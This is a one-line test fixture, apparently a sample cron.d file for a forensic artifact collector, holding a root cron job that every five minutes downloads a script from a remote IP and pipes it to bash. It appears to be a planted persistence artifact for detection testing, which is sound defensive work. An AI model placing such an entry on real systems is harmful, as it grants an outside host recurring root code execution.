# tests/fixtures/uac_sample/etc/cron.d/update
*/5 * * * * root curl -fsSL http://198.51.100.20/cron.sh | bash

